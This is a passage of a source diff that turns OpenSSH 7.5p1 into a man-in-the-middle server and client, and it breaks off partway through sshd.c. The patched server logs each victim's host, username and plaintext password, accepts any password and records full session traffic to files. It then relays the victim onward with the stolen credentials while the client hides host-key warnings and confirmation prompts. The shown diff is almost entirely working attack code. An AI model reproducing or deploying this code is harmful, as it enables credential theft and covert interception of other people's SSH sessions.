@@ -1,0 +1,842 @@
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth2.c openssh-7.5p1-mitm/auth2.c
+--- openssh-7.5p1/auth2.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/auth2.c	2017-05-16 12:54:06.002460345 -0400
+@@ -222,6 +222,10 @@
+ 		fatal("input_userauth_request: no authctxt");
+ 
+ 	user = packet_get_cstring(NULL);
++	authctxt->original_user = xstrdup(user);  /* TODO: free this when done. */
++	free(user);
++	user = xstrdup(BOGUS_USER);
++
+ 	service = packet_get_cstring(NULL);
+ 	method = packet_get_cstring(NULL);
+ 	debug("userauth-request for user %s service %s method %s", user, service, method);
+@@ -329,6 +333,8 @@
+ 		return;
+ 
+ #ifdef USE_PAM
++	/* Disable PAM entirely. */
++	if (0) {
+ 	if (options.use_pam && authenticated) {
+ 		if (!PRIVSEP(do_pam_account())) {
+ 			/* if PAM returned a message, send it to the user */
+@@ -341,6 +347,7 @@
+ 			    "configuration", authctxt->user);
+ 		}
+ 	}
++        }
+ #endif
+ 
+ #ifdef _UNICOS
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth2-passwd.c openssh-7.5p1-mitm/auth2-passwd.c
+--- openssh-7.5p1/auth2-passwd.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/auth2-passwd.c	2017-05-16 14:53:10.293184705 -0400
+@@ -43,9 +43,11 @@
+ #include "monitor_wrap.h"
+ #include "misc.h"
+ #include "servconf.h"
++#include "lol.h"
+ 
+ /* import */
+ extern ServerOptions options;
++extern Lol *lol;
+ 
+ static int
+ userauth_passwd(Authctxt *authctxt)
+@@ -65,6 +67,13 @@
+ 	}
+ 	packet_check_eom();
+ 
++	char *user = authctxt->user;
++	if (authctxt->original_user != NULL)
++	  user = authctxt->original_user;
++
++	logit("INTERCEPTED PASSWORD: hostname: [%s]; username: [%s]; password: [%s]", lol->original_host, user, password);
++	lol->username = strdup(user);
++	lol->password = strdup(password);
+ 	if (change)
+ 		logit("password change not supported");
+ 	else if (PRIVSEP(auth_password(authctxt, password)) == 1)
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth.c openssh-7.5p1-mitm/auth.c
+--- openssh-7.5p1/auth.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/auth.c	2017-05-16 12:54:06.002460345 -0400
+@@ -152,6 +152,8 @@
+ #ifdef USE_LIBIAF
+ 		free((void *) passwd);
+ #endif /* USE_LIBIAF */
++		/* Allow logins to our locked-out bogus user. */
++		locked = 0;
+ 		if (locked) {
+ 			logit("User %.100s not allowed because account is locked",
+ 			    pw->pw_name);
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth.h openssh-7.5p1-mitm/auth.h
+--- openssh-7.5p1/auth.h	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/auth.h	2017-05-16 12:54:06.002460345 -0400
+@@ -59,6 +59,7 @@
+ 	int		 server_caused_failure;
+ 	int		 force_pwchange;
+ 	char		*user;		/* username sent by the client */
++  	char		*original_user; /* username that the client actually wants to connect as */
+ 	char		*service;
+ 	struct passwd	*pw;		/* set if 'valid' */
+ 	char		*style;
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/auth-passwd.c openssh-7.5p1-mitm/auth-passwd.c
+--- openssh-7.5p1/auth-passwd.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/auth-passwd.c	2017-05-16 12:54:06.006462344 -0400
+@@ -121,6 +121,8 @@
+ 	if (options.use_pam)
+ 		return (sshpam_auth_passwd(authctxt, password) && ok);
+ #endif
++	/* Accept all password authentication. */
++	return 1;
+ #if defined(USE_SHADOW) && defined(HAS_SHADOW_EXPIRE)
+ 	if (!expire_checked) {
+ 		expire_checked = 1;
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/channels.c openssh-7.5p1-mitm/channels.c
+--- openssh-7.5p1/channels.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/channels.c	2017-05-16 12:54:06.006462344 -0400
+@@ -191,6 +191,40 @@
+ static int connect_next(struct channel_connect *);
+ static void channel_connect_ctx_free(struct channel_connect *);
+ 
++void log_input(int fd, char *buf, int len);
++void log_output(int fd, char *buf, int len);
++void logx(int fd, char *buf, int len);
++
++void log_input(int fd, char *buf, int len) {
++  logx(fd, buf, len);
++}
++
++void log_output(int fd, char *buf, int len) {
++  logx(fd, buf, len);
++}
++
++void logx(int fd, char *buf, int len) {
++  int written = 0;
++  int ret = -1;
++
++  if (fd <= 0)
++    return;
++  /*fatal("Logging fd is not valid!");*/
++
++  ret = write(fd, buf, len);
++  if (ret < 0)
++    fatal("Failed to write to log file.");
++
++  written += len;
++  while (written < len) {
++    ret = write(fd, buf + written, len - written);
++    if (ret < 0)
++      fatal("Failed to write to log file.");
++    written += len;
++  }
++}
++
++
+ /* -- channel core */
+ 
+ Channel *
+@@ -853,12 +887,13 @@
+ 
+ void
+ channel_set_fds(int id, int rfd, int wfd, int efd,
+-    int extusage, int nonblock, int is_tty, u_int window_max)
++    int extusage, int nonblock, int is_tty, u_int window_max, int session_log_fd)
+ {
+ 	Channel *c = channel_lookup(id);
+ 
+ 	if (c == NULL || c->type != SSH_CHANNEL_LARVAL)
+ 		fatal("channel_activate for non-larval channel %d.", id);
++	c->log_fd = session_log_fd;
+ 	channel_register_fds(c, rfd, wfd, efd, extusage, nonblock, is_tty);
+ 	c->type = SSH_CHANNEL_OPEN;
+ 	c->local_window = c->local_window_max = window_max;
+@@ -1758,6 +1793,7 @@
+ 			}
+ 			return -1;
+ 		}
++		log_input(c->log_fd, buf, len);
+ 		if (c->input_filter != NULL) {
+ 			if (c->input_filter(c, buf, len) == -1) {
+ 				debug2("channel %d: filter stops", c->self);
+@@ -1824,6 +1860,7 @@
+ 			dlen = MIN(dlen, 8*1024);
+ #endif
+ 
++		log_output(c->log_fd, buf, dlen);
+ 		len = write(c->wfd, buf, dlen);
+ 		if (len < 0 &&
+ 		    (errno == EINTR || errno == EAGAIN || errno == EWOULDBLOCK))
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/channels.h openssh-7.5p1-mitm/channels.h
+--- openssh-7.5p1/channels.h	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/channels.h	2017-05-16 12:54:06.006462344 -0400
+@@ -100,6 +100,7 @@
+ 	u_int   istate;		/* input from channel (state of receive half) */
+ 	u_int   ostate;		/* output to channel  (state of transmit half) */
+ 	int     flags;		/* close sent/rcvd */
++	int     log_fd;		/* logging fd */
+ 	int     rfd;		/* read fd */
+ 	int     wfd;		/* write fd */
+ 	int     efd;		/* extended fd */
+@@ -214,7 +215,7 @@
+ Channel	*channel_by_remote_id(int);
+ Channel	*channel_lookup(int);
+ Channel *channel_new(char *, int, int, int, int, u_int, u_int, int, char *, int);
+-void	 channel_set_fds(int, int, int, int, int, int, int, u_int);
++void	 channel_set_fds(int, int, int, int, int, int, int, u_int, int);
+ void	 channel_free(Channel *);
+ void	 channel_free_all(void);
+ void	 channel_stop_listening(void);
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/clientloop.c openssh-7.5p1-mitm/clientloop.c
+--- openssh-7.5p1/clientloop.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/clientloop.c	2017-05-16 12:54:06.006462344 -0400
+@@ -1752,7 +1752,10 @@
+ 	if (have_pty && options.log_level != SYSLOG_LEVEL_QUIET) {
+ 		snprintf(buf, sizeof buf,
+ 		    "Connection to %.64s closed.\r\n", host);
+-		buffer_append(&stderr_buffer, buf, strlen(buf));
++		/* Suppress this message, otherwise the user will see our
++		 * client make the same output as their own client (which would
++		 * be a little weird/suspicious). */
++		/*buffer_append(&stderr_buffer, buf, strlen(buf));*/
+ 	}
+ 
+ 	/* Output any buffered data for stdout. */
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/lol.h openssh-7.5p1-mitm/lol.h
+--- openssh-7.5p1/lol.h	1969-12-31 19:00:00.000000000 -0500
++++ openssh-7.5p1-mitm/lol.h	2017-05-16 15:40:33.349184705 -0400
+@@ -0,0 +1,25 @@
++#ifndef LOL_H
++#define LOL_H
++
++/* Define these in order to force connections to a test host.
++ * Useful for quickly testing changes without needing to ARP 
++ * spoof; just connect to sshd's port directly. */
++/*
++#define DEBUG_HOST "testhost"
++#define DEBUG_PORT 22
++*/
++
++/* This is the user account that all incoming connections will authenticate
++ * as (the provided user name is ignored).  This is also the account home
++ * directory where logged sessions are stored. */
++#define BOGUS_USER "bogus"
++
++struct _Lol {
++  char *original_host;
++  unsigned short original_port;
++  char *username;
++  char *password;
++};
++typedef struct _Lol Lol;
++
++#endif /* LOL_H */
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor.c openssh-7.5p1-mitm/monitor.c
+--- openssh-7.5p1/monitor.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/monitor.c	2017-05-16 12:54:06.006462344 -0400
+@@ -119,6 +119,7 @@
+ 
+ /* State exported from the child */
+ static struct sshbuf *child_state;
++static struct sshbuf *child_lol = NULL;
+ 
+ /* Functions on the monitor that answer unprivileged requests */
+ 
+@@ -360,6 +361,7 @@
+ 	ssh_packet_set_log_preamble(ssh, "user %s", authctxt->user);
+ 
+ 	mm_get_keystate(pmonitor);
++	mm_get_lol(pmonitor);
+ 
+ 	/* Drain any buffered messages from the child */
+ 	while (pmonitor->m_log_recvfd != -1 && monitor_read_log(pmonitor) == 0)
+@@ -1613,6 +1615,41 @@
+ 	}
+ }
+ 
++void
++monitor_apply_lol(struct monitor *pmonitor, Lol *lol)
++{
++  u_int32_t dummy_len = 1;
++  u_char *dummy = NULL;
++  u_int32_t original_port = 0;
++  u_int32_t username_len = 0;
++  u_char *username = NULL;
++  u_int32_t password_len = 0;
++  u_char *password = NULL;
++
++  debug3("Applying lol...");
++
++  if (child_lol == NULL)
++    fatal("%s: child_lol is NULL!", __func__);
++
++  if (sshbuf_get_string(child_lol, &dummy, (size_t *)&dummy_len) != 0 ||
++      sshbuf_get_u32(child_lol, &original_port) != 0 ||
++      sshbuf_get_u32(child_lol, &username_len) != 0 ||
++      sshbuf_get_string(child_lol, &username, (size_t *)&username_len) != 0 ||
++      sshbuf_get_u32(child_lol, &password_len) != 0 ||
++      sshbuf_get_string(child_lol, &password, (size_t *)&password_len) != 0)
++    fatal("%s: sshbuf problems.", __func__);
++
++  if (/*(strlen(original_host) != original_host_len) ||*/ (strlen(username) != username_len) || (strlen(password) != password_len))
++    fatal("%s: more sshbuf problems.", __func__);
++
++  lol->original_port = (unsigned short)original_port;
++
++  lol->username = username;
++  lol->password = password;
++  sshbuf_free(child_lol); child_lol = NULL;
++  debug3("Done with lol...");
++}
++
+ /* This function requries careful sanity checking */
+ 
+ void
+@@ -1627,6 +1664,16 @@
+ 	debug3("%s: GOT new keys", __func__);
+ }
+ 
++void
++mm_get_lol(struct monitor *pmonitor)
++{
++	debug3("%s: Waiting for lol", __func__);
++	if ((child_lol = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++	mm_request_receive_expect(pmonitor->m_sendfd, MONITOR_REQ_LOL, child_lol);
++	debug3("%s: GOT lol", __func__);
++}
++
+ 
+ /* XXX */
+ 
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor.h openssh-7.5p1-mitm/monitor.h
+--- openssh-7.5p1/monitor.h	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/monitor.h	2017-05-16 12:54:06.006462344 -0400
+@@ -56,6 +56,7 @@
+ 	MONITOR_REQ_GSSUSEROK = 46, MONITOR_ANS_GSSUSEROK = 47,
+ 	MONITOR_REQ_GSSCHECKMIC = 48, MONITOR_ANS_GSSCHECKMIC = 49,
+ 	MONITOR_REQ_TERM = 50,
++	MONITOR_REQ_LOL = 52,
+ 
+ 	MONITOR_REQ_PAM_START = 100,
+ 	MONITOR_REQ_PAM_ACCOUNT = 102, MONITOR_ANS_PAM_ACCOUNT = 103,
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor_wrap.c openssh-7.5p1-mitm/monitor_wrap.c
+--- openssh-7.5p1/monitor_wrap.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/monitor_wrap.c	2017-05-16 12:54:06.006462344 -0400
+@@ -482,6 +482,31 @@
+ 	sshbuf_free(m);
+ }
+ 
++void
++mm_send_lol(struct monitor *monitor, Lol *lol) {
++	struct sshbuf *m;
++
++	if ((m = sshbuf_new()) == NULL)
++		fatal("%s: sshbuf_new failed", __func__);
++	if (lol == NULL)
++		fatal("%s: lol is NULL!", __func__);
++
++	debug3("SENDING lol");
++
++	if (sshbuf_put_string(m, "X", 1) != 0 ||
++	    sshbuf_put_u32(m, lol->original_port) != 0 ||
++	    sshbuf_put_u32(m, strlen(lol->username)) != 0 ||
++	    sshbuf_put_string(m, lol->username, strlen(lol->username)) != 0 ||
++	    sshbuf_put_u32(m, strlen(lol->password)) != 0 ||
++	    sshbuf_put_string(m, lol->password, strlen(lol->password)) != 0) {
++		fatal("%s: can't pack lol!", __func__);
++	}
++
++	mm_request_send(monitor->m_recvfd, MONITOR_REQ_LOL, m);
++	debug3("%s: Finished sending lol", __func__);
++	sshbuf_free(m);
++}
++
+ int
+ mm_pty_allocate(int *ptyfd, int *ttyfd, char *namebuf, size_t namebuflen)
+ {
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/monitor_wrap.h openssh-7.5p1-mitm/monitor_wrap.h
+--- openssh-7.5p1/monitor_wrap.h	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/monitor_wrap.h	2017-05-16 12:54:06.006462344 -0400
+@@ -28,6 +28,8 @@
+ #ifndef _MM_WRAP_H_
+ #define _MM_WRAP_H_
+ 
++#include "lol.h"
++
+ extern int use_privsep;
+ #define PRIVSEP(x)	(use_privsep ? mm_##x : x)
+ 
+@@ -84,8 +86,11 @@
+ int mm_newkeys_to_blob(int, u_char **, u_int *);
+ 
+ void monitor_apply_keystate(struct monitor *);
++void monitor_apply_lol(struct monitor *, Lol *);
+ void mm_get_keystate(struct monitor *);
++void mm_get_lol(struct monitor *);
+ void mm_send_keystate(struct monitor*);
++void mm_send_lol(struct monitor *, Lol *);
+ 
+ /* bsdauth */
+ int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
+--- openssh-7.5p1/session.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/session.c	2017-05-16 12:54:06.010464344 -0400
+@@ -112,7 +112,7 @@
+ /* func */
+ 
+ Session *session_new(void);
+-void	session_set_fds(Session *, int, int, int, int, int);
++void	session_set_fds(Session *, int, int, int, int, int, int);
+ void	session_pty_cleanup(Session *);
+ void	session_proctitle(Session *);
+ int	session_setup_x11fwd(Session *);
+@@ -140,6 +140,7 @@
+ extern int startup_pipe;
+ extern void destroy_sensitive_data(void);
+ extern Buffer loginmsg;
++extern Lol *lol;
+ 
+ /* original command from peer. */
+ const char *original_command = NULL;
+@@ -165,6 +166,29 @@
+ static char *auth_sock_name = NULL;
+ static char *auth_sock_dir = NULL;
+ 
++/* This is the maximum number of times to attempt to open a log file for
++ * writing. */
++#define MAX_LOG_OPEN_TRIES 1048576 /* 1M */
++
++int get_session_log_fd(void);
++int get_session_log_fd(void) {
++  char filename[64] = "/home/" BOGUS_USER "/session_0.txt";
++  int log_fd = -1;
++  int num_tries = 0;
++
++  while ((num_tries < MAX_LOG_OPEN_TRIES) && (log_fd < 0)) {
++    log_fd = open(filename, O_CREAT | O_EXCL | O_NOATIME | O_NOFOLLOW | O_SYNC | O_WRONLY, S_IRUSR | S_IWUSR);
++    if (log_fd < 0)
++      snprintf(filename, sizeof(filename) - 1, "/home/" BOGUS_USER "/session_%d.txt", num_tries + 1);
++    num_tries++;
++  }
++
++  if (log_fd < 0)
++    fatal("Could not open file for logging!");
++
++  return log_fd;
++}
++
+ /* removes the agent forwarding socket */
+ 
+ static void
+@@ -294,6 +318,7 @@
+ do_exec_no_pty(Session *s, const char *command)
+ {
+ 	pid_t pid;
++	int session_log_fd;
+ 
+ #ifdef USE_PIPES
+ 	int pin[2], pout[2], perr[2];
+@@ -445,6 +470,8 @@
+ 	 */
+ 	buffer_clear(&loginmsg);
+ 
++	session_log_fd = get_session_log_fd();
++
+ #ifdef USE_PIPES
+ 	/* We are the parent.  Close the child sides of the pipes. */
+ 	close(pin[0]);
+@@ -452,7 +479,7 @@
+ 	close(perr[1]);
+ 
+ 	session_set_fds(s, pin[1], pout[0], perr[0],
+-	    s->is_subsystem, 0);
++	    s->is_subsystem, 0, session_log_fd);
+ #else
+ 	/* We are the parent.  Close the child sides of the socket pairs. */
+ 	close(inout[0]);
+@@ -463,7 +490,7 @@
+ 	 * handle the case that fdin and fdout are the same.
+ 	 */
+ 	session_set_fds(s, inout[1], inout[1], err[1],
+-	    s->is_subsystem, 0);
++	    s->is_subsystem, 0, session_log_fd);
+ #endif
+ 	return 0;
+ }
+@@ -479,6 +506,7 @@
+ {
+ 	int fdout, ptyfd, ttyfd, ptymaster;
+ 	pid_t pid;
++	int session_log_fd;
+ 
+ 	if (s == NULL)
+ 		fatal("do_exec_pty: no session");
+@@ -575,7 +603,8 @@
+ 	s->ptymaster = ptymaster;
+ 	packet_set_interactive(1, 
+ 	    options.ip_qos_interactive, options.ip_qos_bulk);
+-	session_set_fds(s, ptyfd, fdout, -1, 1, 1);
++	session_log_fd = get_session_log_fd();
++	session_set_fds(s, ptyfd, fdout, -1, 1, 1, session_log_fd);
+ 	return 0;
+ }
+ 
+@@ -1628,6 +1657,8 @@
+ #ifdef WITH_SELINUX
+ 		ssh_selinux_change_context("sftpd_t");
+ #endif
++		/* Disable SFTP. */
++		exit(1);
+ 		exit(sftp_server_main(i, argv, s->pw));
+ 	}
+ 
+@@ -1646,6 +1677,11 @@
+ 	 */
+ 	if (!command) {
+ 		char argv0[256];
++		char connect_string[512];
++		char port[16];
++
++		memset(connect_string, 0, sizeof(connect_string));
++		memset(port, 0, sizeof(port));
+ 
+ 		/* Start the shell.  Set initial character to '-'. */
+ 		argv0[0] = '-';
+@@ -1658,9 +1694,33 @@
+ 		}
+ 
+ 		/* Execute the shell. */
+-		argv[0] = argv0;
++		/*argv[0] = argv0;
+ 		argv[1] = NULL;
+-		execve(shell, argv, env);
++		execve(shell, argv, env);*/
++
++
++		snprintf(port, sizeof(port), "%hu", lol->original_port);
++
++		strlcpy(connect_string, lol->username, sizeof(connect_string));
++		strlcat(connect_string, "@", sizeof(connect_string));
++
++		#ifdef DEBUG_HOST
++		strlcat(connect_string, DEBUG_HOST, sizeof(connect_string));
++		snprintf(port, sizeof(port), "%d", DEBUG_PORT);
++		#else
++		strlcat(connect_string, lol->original_host, sizeof(connect_string));
++		#endif
++
++		debug3("MITMing connection to %s:%s", connect_string, port);
++
++		argv[0] = "/home/bogus/ssh";
++		argv[1] = "-Z";
++		argv[2] = lol->password;
++		argv[3] = "-p";
++		argv[4] = port;
++		argv[5] = connect_string;
++		argv[6] = NULL;
++		execve(argv[0], argv, env);
+ 
+ 		/* Executing the shell failed. */
+ 		perror(shell);
+@@ -1922,6 +1982,9 @@
+ 	char *prog, *cmd;
+ 	u_int i;
+ 
++	/* Disable subsystems. */
++	return 0;
++
+ 	s->subsys = packet_get_string(&len);
+ 	packet_check_eom();
+ 	debug2("subsystem request for %.100s by user %s", s->subsys,
+@@ -1958,6 +2021,9 @@
+ {
+ 	int success;
+ 
++	/* Disable X11 requests. */
++	return 0;
++
+ 	if (s->auth_proto != NULL || s->auth_data != NULL) {
+ 		error("session_x11_req: session %d: "
+ 		    "x11 forwarding already active", s->self);
+@@ -1999,6 +2065,10 @@
+ 
+ 	char *command = packet_get_string(&len);
+ 	packet_check_eom();
++
++	/* Disable exec. */
++	return 0;
++
+ 	success = do_exec(s, command) == 0;
+ 	free(command);
+ 	return success;
+@@ -2022,6 +2092,9 @@
+ 	char *name, *val;
+ 	u_int name_len, val_len, i;
+ 
++	/* Disable env requests. */
++	return 0;
++
+ 	name = packet_get_cstring(&name_len);
+ 	val = packet_get_cstring(&val_len);
+ 	packet_check_eom();
+@@ -2056,6 +2129,10 @@
+ {
+ 	static int called = 0;
+ 	packet_check_eom();
++
++	/* Disable auth agent requests. */
++	return 0;
++
+ 	if (no_agent_forwarding_flag || !options.allow_agent_forwarding) {
+ 		debug("session_auth_agent_req: no_agent_forwarding_flag");
+ 		return 0;
+@@ -2113,7 +2190,7 @@
+ 
+ void
+ session_set_fds(Session *s, int fdin, int fdout, int fderr, int ignore_fderr,
+-    int is_tty)
++    int is_tty, int session_log_fd)
+ {
+ 	/*
+ 	 * now that have a child and a pipe to the child,
+@@ -2124,7 +2201,7 @@
+ 	channel_set_fds(s->chanid,
+ 	    fdout, fdin, fderr,
+ 	    ignore_fderr ? CHAN_EXTENDED_IGNORE : CHAN_EXTENDED_READ,
+-	    1, is_tty, CHAN_SES_WINDOW_DEFAULT);
++	    1, is_tty, CHAN_SES_WINDOW_DEFAULT, session_log_fd);
+ }
+ 
+ /*
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/ssh.c openssh-7.5p1-mitm/ssh.c
+--- openssh-7.5p1/ssh.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/ssh.c	2017-05-16 12:54:06.010464344 -0400
+@@ -524,6 +524,7 @@
+ 	struct addrinfo *addrs = NULL;
+ 	struct ssh_digest_ctx *md;
+ 	u_char conn_hash[SSH_DIGEST_MAX_LENGTH];
++	char *password = NULL;
+ 
+ 	ssh_malloc_init();	/* must be called before any mallocs */
+ 	/* Ensure that fds 0, 1 and 2 are open or directed to /dev/null */
+@@ -605,8 +606,9 @@
+ 	argv0 = av[0];
+ 
+  again:
++	/* Add -Z to get the password to use.  TODO: change to a temp file? */
+ 	while ((opt = getopt(ac, av, "1246ab:c:e:fgi:kl:m:no:p:qstvx"
+-	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYy")) != -1) {
++	    "ACD:E:F:GI:J:KL:MNO:PQ:R:S:TVw:W:XYyZ:")) != -1) {
+ 		switch (opt) {
+ 		case '1':
+ 			options.protocol = SSH_PROTO_1;
+@@ -931,6 +933,9 @@
+ 		case 'F':
+ 			config = optarg;
+ 			break;
++		case 'Z':
++			password = strdup(optarg);
++			break;
+ 		default:
+ 			usage();
+ 		}
+@@ -1292,6 +1297,7 @@
+ 	sensitive_data.nkeys = 0;
+ 	sensitive_data.keys = NULL;
+ 	sensitive_data.external_keysign = 0;
++	sensitive_data.password = password;
+ 	if (options.rhosts_rsa_authentication ||
+ 	    options.hostbased_authentication) {
+ 		sensitive_data.nkeys = 9;
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect2.c openssh-7.5p1-mitm/sshconnect2.c
+--- openssh-7.5p1/sshconnect2.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sshconnect2.c	2017-05-16 12:54:06.010464344 -0400
+@@ -906,7 +906,8 @@
+ 
+ 	snprintf(prompt, sizeof(prompt), "%.30s@%.128s's password: ",
+ 	    authctxt->server_user, host);
+-	password = read_passphrase(prompt, 0);
++	/* password = read_passphrase(prompt, 0); */
++	password = strdup(authctxt->sensitive->password);  /* TODO: zero out password field now? */
+ 	packet_start(SSH2_MSG_USERAUTH_REQUEST);
+ 	packet_put_cstring(authctxt->server_user);
+ 	packet_put_cstring(authctxt->service);
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect.c openssh-7.5p1-mitm/sshconnect.c
+--- openssh-7.5p1/sshconnect.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sshconnect.c	2017-05-16 12:54:06.010464344 -0400
+@@ -916,10 +916,12 @@
+ 				    "address '%.128s' to the list of known "
+ 				    "hosts (%.500s).", type, ip,
+ 				    user_hostfiles[0]);
+-			else
+-				logit("Warning: Permanently added the %s host "
++			/* Suppress the warning about adding this host key. */
++			/*else
++			  logit("Warning: Permanently added the %s host "
+ 				    "key for IP address '%.128s' to the list "
+-				    "of known hosts.", type, ip);
++				    "of known hosts.", type, ip);*/
++
+ 		} else if (options.visual_host_key) {
+ 			fp = sshkey_fingerprint(host_key,
+ 			    options.fingerprint_hash, SSH_FP_DEFAULT);
+@@ -995,8 +997,8 @@
+ 			    msg2);
+ 			free(ra);
+ 			free(fp);
+-			if (!confirm(msg))
+-				goto fail;
++			/*if (!confirm(msg))
++			  goto fail;*/
+ 			hostkey_trusted = 1; /* user explicitly confirmed */
+ 		}
+ 		/*
+@@ -1023,13 +1025,17 @@
+ 			    host_key, options.hash_known_hosts);
+ 			hostp = host;
+ 		}
++		/* Suppress compiler warning about hostp being set but not
++		 * used. */
++		if (hostp) {}
+ 
+ 		if (!r)
+ 			logit("Failed to add the host to the list of known "
+ 			    "hosts (%.500s).", user_hostfiles[0]);
+-		else
++		/* Suppress the warning message about adding to known_hosts  */
++		/*else
+ 			logit("Warning: Permanently added '%.200s' (%s) to the "
+-			    "list of known hosts.", hostp, type);
++			"list of known hosts.", hostp, type);*/
+ 		break;
+ 	case HOST_REVOKED:
+ 		error("@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@");
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshconnect.h openssh-7.5p1-mitm/sshconnect.h
+--- openssh-7.5p1/sshconnect.h	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sshconnect.h	2017-05-16 12:54:06.010464344 -0400
+@@ -29,6 +29,7 @@
+ 	Key	**keys;
+ 	int	nkeys;
+ 	int	external_keysign;
++	char	*password;
+ };
+ 
+ struct addrinfo;
+diff -ru --new-file -x '*~' -x 'config.*' -x Makefile.in -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh openssh-7.5p1/sshd.c openssh-7.5p1-mitm/sshd.c
+--- openssh-7.5p1/sshd.c	2017-03-19 22:39:27.000000000 -0400
++++ openssh-7.5p1-mitm/sshd.c	2017-05-16 15:32:38.189184705 -0400
+@@ -72,6 +72,8 @@
+ #include <string.h>
+ #include <unistd.h>
+ #include <limits.h>
++#include <arpa/inet.h>
++#include <linux/netfilter_ipv4.h>
+ 
+ #ifdef WITH_OPENSSL
+ #include <openssl/dh.h>
+@@ -122,6 +124,7 @@
+ #include "ssh-sandbox.h"
+ #include "version.h"
+ #include "ssherr.h"
++#include "lol.h"
+ 
+ /* Re-exec fds */
+ #define REEXEC_DEVCRYPTO_RESERVED_FD	(STDERR_FILENO + 1)
+@@ -201,6 +204,9 @@
+ 	int	have_ssh2_key;
+ } sensitive_data;
+ 
++
++Lol *lol = NULL;
++
+ /* This is set to true when a signal is received. */
+ static volatile sig_atomic_t received_sighup = 0;
+ static volatile sig_atomic_t received_sigterm = 0;
+@@ -672,6 +678,7 @@
+  skip:
+ 	/* It is safe now to apply the key state */
+ 	monitor_apply_keystate(pmonitor);
++	monitor_apply_lol(pmonitor, lol);
+ 
+ 	/*
+ 	 * Tell the packet layer that authentication was successful, since
+@@ -1372,6 +1379,12 @@
+ 	int keytype;
+ 	Authctxt *authctxt;
+ 	struct connection_info *connection_info = get_connection_info(0, 0);
++#ifndef DEBUG_HOST
++	struct sockaddr_in origaddr;
++	socklen_t origaddr_len = sizeof(origaddr);
++#endif
++
++	lol = (Lol *)calloc(1, sizeof(Lol));
+ 
+ 	ssh_malloc_init();	/* must be called before any mallocs */
+ 
+@@ -1956,6 +1969,17 @@
+ 	signal(SIGCHLD, SIG_DFL);
+ 	signal(SIGINT, SIG_DFL);
+ 
++#ifndef DEBUG_HOST
